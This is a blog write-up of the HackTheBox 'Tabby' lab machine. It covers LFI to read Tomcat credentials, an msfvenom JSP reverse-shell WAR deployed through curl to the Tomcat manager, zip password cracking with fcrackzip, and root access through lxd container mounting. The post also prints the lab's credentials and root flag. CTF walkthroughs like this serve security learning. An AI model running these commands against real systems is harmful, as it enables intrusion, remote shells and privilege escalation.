---
date: 2020-11-07 23:48:05
layout: post
title: HackTheBox Tabby Writeup
subtitle: Hackthebox Tabby Writeup
description: >-
  in this blog i've explained how to solve Tabby machine in hackthebox
image: https://i.ibb.co/mBPb1hs/logo.png
optimized_image: https://i.ibb.co/mBPb1hs/logo.png
category: hackthebox
tags:
  - hackthebox
  - Tabby
author: Ahmed Fatouh
paginate: true
---


# []()Methodology

* nmap scan
* LFI Lead to read tomcat user credentials
* exploitation Part
* crack zip file by fcrackzip 
* user part
* Privilege Escalation

# []()Nmap Scan

> **as always, i’ll do nmap scan to find out which services running in this machine.**

* 8080 for apache tomcat

* 22 for ssh

* from nmap scan i know that there is a apache tomcat server.

```ruby

# Nmap 7.80 scan initiated Sun Jun 21 05:43:17 2020 as: nmap -sC -sV -oN scan.txt 10.10.10.194
Nmap scan report for 10.10.10.194
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

> **let's check the web page now.**

![](https://i.ibb.co/b5RHnQj/webpage-mega.png)

> **after looking at the source code i found the way to exploit LFI, let's see how.**

![](https://i.ibb.co/BNg7ZrK/lfi-param.png)

# []() LFI Part

* **from the source code i've found the url: http://megahosting.htb/news.php?file=**

> **the file parameter was vulnerable to LFI, let's check it.**

![](https://i.ibb.co/qNY5mWv/lfi-done.png)

* now we have lfi, let's check the port 8080 now.

![](https://i.ibb.co/Hp3ND9s/port-8080.png)

> from this page we know that the users data we will find it at **tomcat9/tomcat-users.xml**, let's use lfi now.

* from Apache tomcat [Docs](http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html) i know that the file will be in **/usr/share/tomcat9/etc/tomcat-users.xml**

* if you are a linux user you will know that without any blogs because any program data will be found at **/usr/share**

> **here is the credentials for apache tomcat server.**

![](https://i.ibb.co/xfR6Rjq/user-data.png)

* username:**tomcat**
* password:**$3cureP4s5w0rd123!**

> **now we have the credentials, now the exploitation part will be done with 2 ways.**

# []() Exploitation Part

> exploitation part was very easy, we need a **war** format backdoor to upload to the server and start deploying it to get a reverse shell.

* let's generate a war file with **msfvenom**.

> **msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.xx LPORT=9002 -f war > xdev0.war**

* after generating this file we need to upload it and deploy it as a new application.

> **curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file xdev0.war "http://10.10.10.194:8080/manager/text/deploy?path=xdev0.war"**

```ruby

╭─xdev05@nic3One ~/Documents/HTB/Tabby  
╰─➤  curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file xdev0.war "http://10.10.10.194:8080/manager/text/deploy?path=/xdev0.war"
OK - Deployed application at context path [/xdev0.war]
╭─

```
> **let's start nc listener now and open this link http://10.10.10.194:8080/xdev0.war.**

![](https://i.ibb.co/pytCy44/nc.png)

* nice!

> **in this point you can use metasploit too.**

![](https://i.ibb.co/r3rWxQj/metasploit.png)

# []()USER Part

> **after some enumeration, I've found a compressed backup file and after cracking this file I used its password to escalate my privilege to the user privileges.**

* here is the backup file

![](https://i.ibb.co/nsZ1vjz/backup-file.png)

* let's crack it now with **fcrackzip**

> **fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip**

![](https://i.ibb.co/5TFBTT6/fcrack-result.png)

* let's escalate our privilege now.

> **su ash**

![](https://i.ibb.co/p2GjmMp/user.png)

* user part done!.

# []()ROOT Part

> the user **ash** is a member of **lxd local group**

```ruby

ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)

```
> **from this [Blog](https://www.hackingarticles.in/lxd-privilege-escalation/) i know the way to escalate my privileges to root privilege.**

1. **Steps to be performed on the attacker machine.**

* Download build-alpine in your local machine through the git repository.

* Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.

* Transfer the tar file to the host machine

2. **Steps to be performed on the Tabby machine.**

* Download the alpine image from your machine

* Import image for lxd

* Initialize the image inside a new container.

* Mount the container inside the /root directory 

* let's start now.

```ruby

╭─xdev05@nic3One ~/Documents/HTB/Tabby/lxd-alpine-builder  ‹master*› 
╰─➤  ls
alpine-v3.12-x86_64-20201106_1805.tar.gz  build-alpine  LICENSE  README.md
╭─xdev05@nic3One ~/Documents/HTB/Tabby/lxd-alpine-builder  ‹master*› 
╰─➤  

```

> **let's start a python server and upload the image to the Tabby machine**

![](https://i.ibb.co/NYBx9dG/lxd-upload.png)

* now let's import our image

> **lxc image import ./alpine-v3.12-x86_64-20201106_1805.tar.gz --alias devil**

![](https://i.ibb.co/kHqxxx4/image-lxc.png)

> **lxc init devil ignite -c security.privileged=true**

> **lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true**

> **lxc start ignite**

> **lxc exec ignite /bin/sh**

![](https://i.ibb.co/QrGJ4st/root-part.png)

> **root flag**

```ruby

/mnt/root/root # cat root.txt
cat root.txt
8eca10cfde310d8b2c7668bee56818b5
/mnt/root/root #

```

* Thanks for reading.

* Cheers!

 <script src="https://www.hackthebox.eu/badge/103789"></script>


